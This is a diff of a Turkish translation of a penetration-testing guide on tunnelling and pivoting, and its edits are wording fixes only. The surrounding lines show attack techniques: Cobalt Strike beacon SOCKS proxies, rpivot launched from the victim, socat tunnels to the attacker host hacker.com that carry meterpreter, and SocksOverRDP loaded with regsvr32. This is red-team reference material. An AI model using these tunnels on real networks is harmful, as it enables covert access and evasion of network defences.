@@ -5,7 +5,7 @@
 ## Nmap ipucu
 
 > [!WARNING]
-> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramaları** (`-sT`) belirtmeliyiz.
+> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramalarını** (`-sT`) belirtmeliyiz.
 
 ## **Bash**
 
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tüneli
 
-Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırmasının root girişine izin vermesi gerekiyor:\
+Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Sunucu tarafında yönlendirmeyi etkinleştir
+Sunucu tarafında yönlendirmeyi etkinleştirin
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Tüm arayüzlerde dinleyen bir port açın, bu port **trafiği beacon üzerinden yönlendirmek için** kullanılabilir.
+Trafiği **beacon üzerinden yönlendirmek** için kullanılabilecek tüm arayüzlerde teamserver'da bir port açın.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -153,7 +153,7 @@ rportfwd stop [bind port]
 Not edilmesi gerekenler:
 
 - Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
-- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları da dahil.
+- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
 - Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekmez**.
 
 ### rPort2Port yerel
@@ -237,7 +237,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Ters tünel. Tünel kurban tarafından başlatılır.\
+Ters tünel. Tünel, kurban tarafından başlatılır.\
 127.0.0.1:1080 adresinde bir socks4 proxy oluşturulur.
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-**NTLM proxy** üzerinden geçiş yapın
+**NTLM proxy** üzerinden geçiş yapma
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son satırın yerine bu satırı çalıştırarak atlayabilirsiniz:
+**Kimlik doğrulaması yapılmamış bir proxy'yi** atlamak için, kurbanın konsolundaki son satır yerine bu satırı çalıştırabilirsiniz:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -356,7 +356,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız ve bu **127.0.0.1:1080** adresinde **dinleyecektir**.
 
-**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
+**RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikilisini yükleyip çalıştırın:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Buna saldırganın 2222 numaralı portu üzerinden bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri internete açmak için bir araçtır.**\
-_&#x45;xposition URI'leri şunlar gibidir:_ **UID.ngrok.io**
+_Exposition URI şöyle görünür:_ **UID.ngrok.io**
 
 ### Kurulum
 
